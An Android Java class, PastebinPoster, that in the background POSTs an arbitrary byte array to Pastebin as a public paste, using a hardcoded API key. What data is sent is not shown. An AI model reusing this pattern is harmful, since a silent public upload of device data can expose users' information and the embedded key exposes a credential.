package com.animal;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import android.os.AsyncTask;

public class PastebinPoster extends AsyncTask<byte[], Void, Void> {

	private static String PASTEBIN_API_KEY = "32e431e201df8b8db18550f1c19dd696";
	
	@Override
	protected Void doInBackground(byte[]... bytes) {
		try {
			String url = "http://pastebin.com/api/api_post.php";
			URL obj = new URL(url);
			HttpURLConnection connection = (HttpURLConnection) obj.openConnection();
	 
			connection.setRequestMethod("POST");
			connection.setRequestProperty("User-Agent", "Mozilla/5.0");
			connection.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
			
			StringBuilder payload = new StringBuilder();
			for (byte b : bytes[0]) {
				payload.append((char) b);
			}

			StringBuilder urlParameters = new StringBuilder();
			urlParameters.append("api_option=paste");
			urlParameters.append("&api_dev_key=").append(PASTEBIN_API_KEY);
			urlParameters.append("&api_paste_code=").append(payload);
			urlParameters.append("&api_paste_private=0");					//público
	 
			connection.setDoOutput(true);
			DataOutputStream output = new DataOutputStream(connection.getOutputStream());
			output.writeBytes(urlParameters.toString());
			output.flush();
			output.close();
	 
			int responseCode = connection.getResponseCode();
			BufferedReader input = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			String inputLine;
			StringBuffer response = new StringBuffer();
			while ((inputLine = input.readLine()) != null) {
				response.append(inputLine);
			}
			
			input.close();
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

}
